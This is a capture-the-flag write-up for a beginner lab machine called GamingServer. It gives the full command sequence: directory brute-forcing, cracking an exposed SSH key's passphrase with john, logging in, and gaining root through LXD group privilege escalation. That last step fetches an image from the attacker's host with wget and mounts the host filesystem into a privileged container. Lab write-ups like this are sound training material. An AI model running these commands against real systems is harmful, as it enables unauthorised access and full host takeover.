# GamingServer

An Easy Boot2Root box for beginners.  
Can you gain access to this gaming server built by amateurs with no experience of web development and take
advantage of the deployment system.  

# Tasks
find the user flag and the root flag.  

# nmap

## command
```sh
nmap -sV -sC -v 10.10.69.28
```
# Results
```sh

# http_80

## ip `10.10.69.28`

# Gobuster

## Command
```sh
gobuster dir -u http://10.10.69.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
## Result
```sh
	/secrets
	/uploads
```

## /secrects
I got a secret file that after downloading i found that it was a `ssh RSA`

## /uploads
I downloaded the dict.lst file that contains a list of i think passwords or usernames.  

Manifesto.txt `very useless manifesto that is only there to teach you poetry`



# sourcecode

Going back i got a comment from the dev.  


## so far we have  
- ssh RSA
- A dict.lst = i assume is a dictionary/ wordlist
- A user : john 

# ssh_22

First attempt
----------------------------------------------
```sh
hydra -l john -P dict.lst 10.10.69.28 ssh 
```

-------------------------------------------------
Second Attempt
-------------------------------------------------
```sh
	ssh2john secretKey > secret  
	john --wordlist=dict.lst secret
```

---------------------------------------------------
Third Attempt
---------------------------------------------------
```sh
chmod 600 secretKey
ssh john@10.10.69.28 -i secretKey
```
This was much better.  

-----------------------------------------------------
Forth Attempt
-----------------------------------------------------
```sh
/usr/share/john/ssh2john.py secretKey > secret
sudo john secret -w=dict.lst
```

Now i have the passphrase `letmein`  
Later, back to my senses and spotted my mistakes,Can you??  

-------------------------------------------------------
Login to ssh john
-------------------------------------------------------
```sh
	sudo ssh john@10.10.69.28 -i secretKey
	#passphrase = letmein
```

And now i have a shell.

`ls` and `cat user.txt` to get the user flag.  


# PRIVILEGE ESCALATION
```sh
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
We use a method called `Lxd Privilege Escalation`  
Privilege escalation through lxd requires the access of local account, Good thing for us since we have SSH access already.  
Note: the `most important condition` is that the user should be a `member of lxd group`.  
To start with we need to download the lxd-alpine image builder to our local machine:  
```sh
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder 
sudo ./build-alpine -a i686 #run the build-alpine
```
When you ls the directory you will see that you have the image file with the .gz extension.  
Next we need to setup a simple http server and upload to the image file to the remote machine.  
```sh
python3 -m http.server
```
We can use wget on the remote machine to upload the .qz file.  
```sh
wget http://10.8.172.59:8000/alpine-v3.19-i686-20240201_2212.tar.gz
```
Once uploaded we next need to import the image into lxd.  
```sh
lxc image import alpine-v3.19-i686-20240201_2212.tar.gz --alias alpine
```
If we use the command, “lxc image list”, we can see that the image is now available on lxd.  
We now need to create a machine from the image.  
```sh
lxc init alpine privesc -c security.privileged=true
```
Where alpine is the image file and privesc is what I am calling the machine.  
Next we need to add a hard drive to the machine, the privesc technique in this case looks to have the whole host
mounted in the /mnt/root and thus you have root access.  
```sh
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
As noted above the machine privesc is currently stopped, so we will need to start it:
```sh
lxc start privesc
```
To exploit the machine
```sh
lxc exec privesc /bin/sh
```

## Now you are root 
## Go get the flag!!!
